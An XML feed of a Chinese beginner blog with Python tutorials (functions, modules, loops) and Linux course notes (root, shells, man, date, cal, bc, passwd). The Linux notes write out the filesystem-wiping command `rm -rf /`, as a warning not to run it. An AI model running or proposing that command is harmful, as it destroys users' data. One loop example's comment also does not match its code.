<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">abs</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment"># 取绝对值</span>
<span class="token number">10</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">round</span><span class="token punctuation">(</span><span class="token number">1.5</span><span class="token punctuation">)</span> <span class="token comment"># 四舍五入</span>
<span class="token number">2</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 将一个列表或者类似的数据类型中的所有元素加起来</span>
<span class="token number">15</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>round函数用于四舍五入，有时候我们需要把数值向下取整，我们可以利用<code>int()</code>转换成整数时截断小数来实现，也可以使用一个叫floor的函数实现，这个函数不能直接使用，它存在于一个模块中。</p>
<h3 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h3><p>我们可以把功能类似的函数，比如用于数学运算的函数，放到一个模块中统一管理，python有很多优秀的内置模块，其中还真有一个数学相关的模块，称为math。</p>
<p>我们可以使用关键字import导入模块，像下面这样使用前面提到的floor函数对数值向下取整：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> math <span class="token comment"># 导入模块</span>
<span class="token operator">>></span><span class="token operator">></span> math<span class="token punctuation">.</span>floor<span class="token punctuation">(</span><span class="token number">1.9</span><span class="token punctuation">)</span> <span class="token comment"># 使用math模块中的floor函数</span>
<span class="token number">1</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>如果不想每次调用函数都在前加上模块名字的话，可以使用以下的形式：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">from</span> math <span class="token keyword">import</span> ceil
<span class="token operator">>></span><span class="token operator">></span> ceil<span class="token punctuation">(</span><span class="token number">12.1</span><span class="token punctuation">)</span> <span class="token comment"># 向上取整</span>
<span class="token number">13</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>像上面那样，使用 <code>from 模块 import 函数1,函数2,函数3</code> 这种形式的import语句，可以直接使用函数的名字进行调用，但是要确保不要存在同名的函数，如果存在同名的函数，使用的是后导入的函数。</p>
<p>还有一种形式的import语句，添加<code>as</code>关键字可以为函数或者模块设置别名，比如：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 把floor导入使用fl作为别名，把ceil导入并使用ce作为别名</span>
<span class="token keyword">from</span> math <span class="token keyword">import</span> floor <span class="token keyword">as</span> fl<span class="token punctuation">,</span>ceil <span class="token keyword">as</span> ce
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'fl(12.9) is'</span><span class="token punctuation">,</span> fl<span class="token punctuation">(</span><span class="token number">12.9</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 向下取整</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ce(14.1) is'</span><span class="token punctuation">,</span> ce<span class="token punctuation">(</span><span class="token number">14.1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 向上取整</span>

<span class="token comment"># 导入math模块，使用别名m</span>
<span class="token keyword">import</span> math <span class="token keyword">as</span> m
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'m.floor(12.9) is'</span><span class="token punctuation">,</span> m<span class="token punctuation">.</span>floor<span class="token punctuation">(</span><span class="token number">12.9</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'m.ceil(14.1) is'</span><span class="token punctuation">,</span> m<span class="token punctuation">.</span>ceil<span class="token punctuation">(</span><span class="token number">14.1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'m.sqrt(4) is'</span><span class="token punctuation">,</span> m<span class="token punctuation">.</span>sqrt<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 计算4的平方根</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>小提示</strong>：其实，我们还可以把函数赋值给一个变量，使用变量来调用函数，比如<code>func=math.floor</code>，然后就可以使用<code>func(12.9)</code>来调用floor函数对12.9向下取整了</p>
<hr>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这一节我们学习了函数和模块的概念，并使用input函数获取输入，增加程序的交互，下一节将介绍如何自己创建函数，并在结束函数的学习后，做一个像样的小例子，敬请期待 <code>ヾ(￣▽￣)Bye~Bye~</code></p>
]]></content>
      <categories>
        <category>python教程</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux开发环境及应用·第一周·开始使用Linux（二）</title>
    <url>/fa9a79d5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>因为是高三学生，空闲时间比较少，所以这些笔记整理出来比较慢，见谅，见谅。</p>
<p>既然是做笔记，这一次就不全部照抄ppt了，要加入自己的理解。<span id="more"></span></p>
<h3 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h3><p>Linux中的用户分为，普通用户和超级用户（root）。</p>
<p>root用户（超级用户）不受权限的制约，可以随意修改和删除文件，甚至是删除整个根目录：<code>rm -rf /</code> 千万不要作死用root权限运行上述命令！在root权限下一定要小心、谨慎地操作 <code>(°ー°〃)</code></p>
<p>普通用户由root用户使用useradd命令创建，用户的信息放在/etc/passwd文件中，包括 <strong>用户名</strong> 和 <strong>用户ID</strong>，以及 <strong>Home目录</strong> 的位置。</p>
<h3 id="登录Shell"><a href="#登录Shell" class="headerlink" title="登录Shell"></a>登录Shell</h3><p>登录Shell一般为bash，也可以选择其它shell，其它系统程序，甚至自己设计的程序。</p>
<p>用户可以从普通终端或者网络虚拟终端登入系统。</p>
<p>登入shell后，出现的shell提示符有以下两种</p>
<ul>
<li><code>$</code>  Bourne Shell系列（sh，ksh，bash）</li>
<li><code>#</code> 表示当前用户为root用户</li>
</ul>
<p>出现shell提示符就可以输入命令了，Linux的系统命令是区分大小写的，比如：<code>ls</code>和<code>LS</code>是两个不同的命令，只是举个例子，<code>LS</code>这个命令不一定存在。</p>
<h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><ul>
<li>man 查阅手册</li>
<li>date 日期和时间</li>
<li>cal 日历</li>
<li>bc 计算器</li>
<li>passwd 修改口令</li>
</ul>
<h4 id="man"><a href="#man" class="headerlink" title="man"></a>man</h4><p>man命令用户查阅联机手册，内容包括：</p>
<ul>
<li>各种命令的说明书</li>
<li>系统调用的使用手册</li>
<li>C语言和其它语言的库函数手册</li>
<li>系统配置文件格式</li>
</ul>
<p>最常用的命令一般是由两到三个字母组成，就如man命令的名字取自manual的前三个字母。</p>
<p>用法：</p>
<ul>
<li><code>man name</code> 最基本用法，查看man命令本身的用法可以用<code>man man</code></li>
<li><code>man section name</code> 章节编号: 1为命令，2为系统调用，3为库函数，5为配置文件</li>
<li><code>man -k regexp</code> 列出关键字与正则表达式<code>regexp</code>匹配的手册项目录</li>
<li>按<code>q</code>退出，按空格翻到下一页，上下箭头控制上下滚动一行。</li>
</ul>
<p>手册页的内容为：</p>
<ul>
<li>列出基本功能和语法</li>
<li>对于C语言的函数调用，列出头文件和链接函数库</li>
<li>功能说明</li>
<li>SEE ALSO：有关其它项目的名字和章节号</li>
</ul>
<p>运行<code>man man</code></p>
<pre class="line-numbers language-none"><code class="language-none">MAN(1)                         手册分页显示工具                         MAN(1)

名称
       man - 在线参考手册的接口

概述
       man  [-C  文件]  [-d]  [-D] [--warnings[&#x3D;警告]] [-R 编码] [-L 区域] [-m
       系统[,...]] [-M 路径] [-S 列表] [-e 扩展] [-i|-I]  [--regex|--wildcard]
       [--names-only]  [-a]  [-u] [--no-subpages] [-P 分页程序] [-r 提示] [-7]
       [-E 编码]  [--no-hyphenation]  [--no-justification]  [-p  字符串]  [-t]
       [-T[设备]] [-H[浏览器]] [-X[dpi]] [-Z] [[章节] 页[.章节] ...] ...
       man -k [apropos 选项] 正则表达式 ...
       man -K [-w|-W] [-S list] [-i|-I] [--regex] [章节] 词语 ...
       man -f [whatis 选项] 页 ...
       man  -l [-C 文件] [-d] [-D] [--warnings[&#x3D;警告]] [-R 编码] [-L 区域] [-P
       分页程序]  [-r  提示]  [-7]  [-E  编码]  [-p  字符串]  [-t]  [-T[设备]]
       [-H[浏览器]] [-X[dpi]] [-Z] 文件 ...
       man -w|-W [-C 文件] [-d] [-D] 页 ...
       man -c [-C 文件] [-d] [-D] 页 ...
       man [-?V]

描述
       man         是系统的手册分页程序。指定给        man        的        页
 Manual page man(1) line 1 (press h for help or q to quit)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h4 id="date"><a href="#date" class="headerlink" title="date"></a>date</h4><p>date命令最基本用法就是不带任何参数运行：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">date</span>
<span class="token number">2019</span>年 01月 <span class="token number">19</span>日 星期六 <span class="token number">13</span>:45:33 CST<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>我们还可以带一个参数来控制输出格式。</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">date</span> <span class="token string">'+%Y-%m-%d'</span>
<span class="token number">2019</span>-01-19<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>这个参数叫做格式控制字符串，用法如下：</p>
<ul>
<li>第一个字符必须为<code>+</code></li>
<li><code>%Y</code>  year 年</li>
<li><code>%m</code> month 月</li>
<li><code>%d</code> day 日</li>
<li><code>%j</code> 这一年的第几天，用三位数表示</li>
<li><code>%H</code> hour 时</li>
<li><code>%M</code> minute 分</li>
<li><code>%S</code> second 秒</li>
<li><code>%s</code> 这个<code>s</code>是小写，表示 <strong>时间戳</strong>，是从1970年1月1日（UTC/GMT的午夜）开始所经过的秒数，不考虑闰秒</li>
<li><code>%a</code> 星期几的缩写，大写<code>%A</code>则表示全称，比如<code>Sat</code>和<code>Saturday</code>，我的系统语言是中文的，所以是<code>六</code>和<code>星期六</code></li>
<li><code>%%</code> 表示<code>%</code>本身这个字符</li>
</ul>
<p>下面来输出类似如下的日期</p>
<pre class="line-numbers language-none"><code class="language-none">% 2018年 1月1日 星期一 第001天 时间 -&gt; 14:07:01 时间戳 -&gt; 1234567 % <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>代码如下：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">date</span> <span class="token string">'+%% %Y年 %m月%d日 %A 第%j天 时间 -> %H:%M:%S 时间戳 -> %s %%'</span>
% <span class="token number">2019</span>年 01月19日 星期六 第019天 时间 -<span class="token operator">></span> <span class="token number">14</span>:12:05 时间戳 -<span class="token operator">></span> <span class="token number">1547878325</span> %<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>date还可以设置系统时间，不过需要root权限，更详细的用法可用man命令查看</p>
<p>可以通过NTP协议校准系统时间，命令为ntpdate：</p>
<ul>
<li><code>ntpdate -q 0.pool.ntp.org</code> 查询0.pool.ntp.org的时间，普通用户也可以用</li>
<li><code>ntpdate 0.pool.ntp.org</code> 设置时间，必须为root用户</li>
</ul>
<hr>
<h4 id="cal"><a href="#cal" class="headerlink" title="cal"></a>cal</h4><p>直接输入<code>cal</code>不带任何参数则显示当前月份，如下：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">cal</span>
      一月 <span class="token number">2019</span>     
日 一 二 三 四 五 六
       <span class="token number">1</span>  <span class="token number">2</span>  <span class="token number">3</span>  <span class="token number">4</span>  <span class="token number">5</span>
 <span class="token number">6</span>  <span class="token number">7</span>  <span class="token number">8</span>  <span class="token number">9</span> <span class="token number">10</span> <span class="token number">11</span> <span class="token number">12</span>
<span class="token number">13</span> <span class="token number">14</span> <span class="token number">15</span> <span class="token number">16</span> <span class="token number">17</span> <span class="token number">18</span> <span class="token number">19</span>
<span class="token number">20</span> <span class="token number">21</span> <span class="token number">22</span> <span class="token number">23</span> <span class="token number">24</span> <span class="token number">25</span> <span class="token number">26</span>
<span class="token number">27</span> <span class="token number">28</span> <span class="token number">29</span> <span class="token number">30</span> <span class="token number">31</span>               <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面的<code>19</code>背景颜色是不一样的，表明今天是19日。</p>
<p>其它用法：</p>
<ul>
<li><code>cal year</code> 例：打印2020年的日历 <code>cal 2020</code></li>
<li><code>cal month year</code> 例：打印2019年1月的日历 <code>cal 1 2019</code></li>
</ul>
<hr>
<h4 id="bc"><a href="#bc" class="headerlink" title="bc"></a>bc</h4><p>bc是一个功能强大的计算器，除了基本计算外，还支持变量，函数，条件和循环等编程功能，使用类似C语言语法的小型编程语言，并且可以进行任意精度的计算！</p>
<p>启动后以交互式的方式运行，输入<code>quit</code>退出，基本用法如下</p>
<ul>
<li><code>bc</code> 无参数启动，缺省精度是小数点后0位</li>
<li><code>bc -l</code> 用<code>-l</code>参数启动，缺省精度是小数点后20位</li>
<li>在交互式环境中输入<code>scale=100</code>可以设置精度为100（小数点位数）</li>
<li>在交互式环境中，可以像C语言一样进行编程，变量不需要指定类型，比如计算1加到100，可以输入<code>for(i=1;i&lt;=100;i++)&#123;sum+=i&#125;</code>然后输入<code>sum</code>显示变量的值（所有未初始化的变量默认自动初始化为0）</li>
<li><code>bc file</code> 可以将指令写在一个文件内，用文件名作为参数给bc运行</li>
</ul>
<hr>
<h4 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h4><p>passwd用于更换用户口令（可以认为是密码，不过严格来说密码和口令是两个概念）。</p>
<p>普通用户使用<code>passwd</code>更换自己的口令，更改前要先验证原来的口令。</p>
<p>root用户修改口令不用验证原来的口令，还可以强行设置其它用户的口令。比如：<code>passwd aaa</code>可强行设置用户aaa的口令，但是root用户不可以读取其它用户的口令，因为口令是加密存储的，而且这种加密是不可逆的。</p>
<hr>
<h3 id="口令的设置与验证"><a href="#口令的设置与验证" class="headerlink" title="口令的设置与验证"></a>口令的设置与验证</h3><p>口令的保存为如下形式：</p>
<pre class="line-numbers language-none"><code class="language-none">系统生成的序列 + 用户口令加密成长度固定的哈希值<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>验证口令时，先用提供的口令用同样的加密方式加密，将得到的哈系值与系统储存的哈系值比较即可。</p>
]]></content>
      <categories>
        <category>MOOC课程学习·Linux开发环境及应用</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>python教程（二）·循环语句</title>
    <url>/d7b5f79d/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>计算机程序中常常需要重复执行某些语句，我们总不能将同一语句写上百遍吧？所以在python中，当然其它计算机语言也是，有一种语句可以重复执行相同的操作，这种语句<span id="more"></span>就是 <strong>“循环语句”</strong>，而被重复执行的一组语句称为 <strong>“循环体”</strong>。</p>
<p>在python中有两种循环语句，分别是<code>for</code>循环语句，<code>while</code>循环语句，下面来一一介绍。</p>
<hr>
<h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><p><code>for</code>循环在上一节中也提到了，可以用来遍历列表、元组、字典，如下代码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'python'</span><span class="token punctuation">,</span> <span class="token string">'c/c++'</span><span class="token punctuation">,</span> <span class="token string">'java'</span><span class="token punctuation">,</span> <span class="token string">'php'</span><span class="token punctuation">]</span>
tuple1 <span class="token operator">=</span> <span class="token builtin">tuple</span><span class="token punctuation">(</span>list1<span class="token punctuation">)</span> <span class="token comment"># 将list1转换成list1</span>
dict1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">'baidu'</span><span class="token punctuation">:</span><span class="token string">'https://www.baidu.com'</span><span class="token punctuation">,</span>
    <span class="token string">'feather'</span><span class="token punctuation">:</span><span class="token string">'https://featherl.gitee.io'</span>
<span class="token punctuation">&#125;</span>

<span class="token comment"># 遍历列表</span>
<span class="token keyword">for</span> e <span class="token keyword">in</span> list1<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-----'</span><span class="token punctuation">)</span>

<span class="token comment"># 遍历元组</span>
<span class="token keyword">for</span> e <span class="token keyword">in</span> tuple1<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-----'</span><span class="token punctuation">)</span>

<span class="token comment"># 遍历字典</span>
<span class="token keyword">for</span> k <span class="token keyword">in</span> dict1<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span>dict1<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>输出：</p>
<pre class="line-numbers language-none"><code class="language-none">python
c&#x2F;c++
java
php
-----
python
c&#x2F;c++
java
php
-----
baidu https:&#x2F;&#x2F;www.baidu.com
feather https:&#x2F;&#x2F;featherl.gitee.io<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<p>上面的只是基本，现在来详细讲讲。</p>
<p><code>for</code>语句和<code>if</code>语句一样，是一种代码块，其基本形式为：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> 变量 <span class="token keyword">in</span> 可迭代对象<span class="token punctuation">:</span>
    循环体<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>上面的“可迭代对象”暂时理解成列表、元组、字典这些数据类型，<code>for</code>语句会把可迭代对象中的元素赋值给“变量”，执行“循环体”，再把下一个元素赋值给“变量”，再执行“循环体”，这样一直循环下去，直至所有元素都遍历完</p>
<p>上面讲的是遍历“可迭代对象”，而本节讲的是循环，是不是有点离题？既然是“循环”，是否可以控制代码执行5次或者100次呢？</p>
<p>学过C语言、java或者其它类似语言的同学会知道，<code>for</code>循环通常会有这样的形式：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//打印5行数字，分别是0、1、2、3、4</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//这行代码执行了5次</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>如果要像上面那样输出5行连续的数字，或者说执行同样的代码5次，在python中该怎么做呢？</p>
<p>有同学可能这么说：</p>
<blockquote>
<p>“这个不难，可以定义一个列表：[0, 1, 2, 3, 4]，然后用for循环遍历输出”</p>
</blockquote>
<p>对于这么想的同学，我只想表示，不如你去试试输出0～1000的 <code>(≧∀≦)ゞ</code></p>
<p>开个玩笑而已，不要当真，回到话题上，难不成真的要手动输入成百上千个数字的列表吗？肯定不是，上代码！</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 输出100行整数，0～100,不包括100</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>在这里有必要提一下下一节的知识了，这个<code>range</code>是一个函数，<code>100</code>是它的一个参数，<code>range(100)</code>表示调用这个函数，并提供参数<code>100</code>，<code>range</code>函数的作用是生成一个类似列表的东西，就当是列表（在python2.x中它就是列表，我们学的是python3.x，不太一样），它返回的这个“列表”含有整数0~99，用数学上的区间表示就是：<code>[0, 100)(x ∈ Z)</code>，也就是 <strong>整数0到100，不包括100</strong></p>
<p>好了，点到为止，关于函数的详细讲解会在下一节介绍。</p>
<p>介绍完<code>range</code>函数后就清楚很多了，上面的代码相当于用<code>for</code>循环遍历了一个列表，这个列表含有整数0～100（不包括100 即0~99），然后输出遍历得到的整数。</p>
<p>回到根源，我们其实想做的是，将同样的代码重复执行一定次数，所以当我们要重复执行100次同样的代码，可以这么做：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 因为range(100)生成整数0~99，有100个整数，所以循环执行100次</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
   代码块<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>有时候我们真的只是想得到连续的整数，并且我们不要0～99而要2~10这样不是0开始的连续整数，这时我们调用<code>range</code>函数的方式就要变一变了。下面看代码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># range(起点，终点)</span>
<span class="token comment"># range(2, 10)中，第一个参数2表示从2开始生成整数，生成的整数小于10</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>又有时候，我们需要连续的整数，这些整数之间的间隔不是常规的1，而是2或以上，比如偶数和奇数，这时可以用3个参数的调用方法，其中一个参数指定间隔，代码如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># range(起点，终点，间隔)</span>
<span class="token comment"># range(1, 10, 2) 生成 1、3、5、7、9 间隔为2，也就是每2步取一个数</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>又有时候……</p>
<p>还有 <code>⊙▽⊙</code>？！</p>
<p>应该是没有了  <code>^_^</code></p>
<hr>
<h3 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h3><p>咳咳～</p>
<p>我们继续。</p>
<p>相比<code>for</code>循环，<code>while</code>循环则简单很多，C语言中的<code>while</code>循环是这样的：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">while</span><span class="token punctuation">(</span>条件<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    代码块
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>C语言的代码块是用花括号标识的<code>&#123;中间是代码块&#125;</code>，而python呢，前面也学习到，python使用缩进的方式来标识代码块，所以除了代码块的表示方式不一样外，<code>while</code>循环的形式和C语言是非常相像的：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">while</span> 条件<span class="token punctuation">:</span>
    代码块<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><code>while</code>语句的工作方式是这样的：首先，判断条件，若条件不成立，则这个<code>while</code>语句执行完毕；若条件成立，则执行代码块；这样为一轮循环，只要条件一直成立，这个<code>while</code>语句也就一直执行下去。</p>
<p>现在我们来用<code>while</code>循环改写上面<code>for</code>循环输出连续整数的代码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 输出整数0~99</span>
i <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">while</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    i <span class="token operator">+=</span> <span class="token number">1</span> <span class="token comment"># i=i+1 也就是给i加上1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>注</strong>：其实，一般情况下，明确知道循环的次数或者遍历可迭代的对象的时候使用<code>for</code>循环，其它情况下使用<code>while</code>循环，所以上面的代码仅做例子，实际中并不用<code>while</code>来做这种情况，而是用<code>for</code>循环。</p>
<hr>
<h3 id="循环控制"><a href="#循环控制" class="headerlink" title="循环控制"></a>循环控制</h3><p>循环的条件是什么？执行到什么时候？</p>
<p>在某些情况下，我们是无法在一开始就确定上述问题的答案的，我们需要根据实际情况来断定循环是否要中断，或者跳过这一次循环直接开始下一次条件的判断，这时候就需要循环的控制语句。</p>
<p>循环控制语句只有两种：</p>
<ul>
<li>break</li>
<li>continue</li>
</ul>
<p>这两种语句也就仅仅两个关键字，<code>break</code>、<code>continue</code>，<code>break</code>终止当前循环，而<code>continue</code>则跳过本次循环直接开始下一轮循环，它们适用于所有循环语句（一共就两种循环语句），下面以<code>for</code>循环来讲解。</p>
<p>抛出一段简单的代码，看注释即可：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>
        <span class="token comment"># 跳过 i为2的一轮循环</span>
        <span class="token keyword">continue</span>
    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">7</span><span class="token punctuation">:</span>
        <span class="token comment"># i为7时终止循环</span>
        <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token comment"># 输出变量i</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>运行上面代码得到如下输出：</p>
<pre class="line-numbers language-none"><code class="language-none">0
1
3
4
5
6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这一节我们学习了两种循环语句，分别<code>for</code>循环和<code>while</code>循环，通常在确定循环次数时，或者用于遍历时，使用<code>for</code>循环，其它情况使用<code>while</code>循环。</p>
<p>我们还了解了循环控制语句，<code>break</code>和<code>continue</code>，<code>break</code>用于终止循环，<code>continue</code>用于跳过当前这轮循环，结合条件语句，我们可以很好的控制循环的进行。</p>
<hr>
<p>这一节有点长，望读者能好好消化，下一节见 <code>ヾ(￣▽￣)、</code></p>
]]></content>
      <categories>
        <category>python教程</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux开发环境及应用·第一周·开始使用Linux（一）</title>
    <url>/4fa6d7c7/</url>
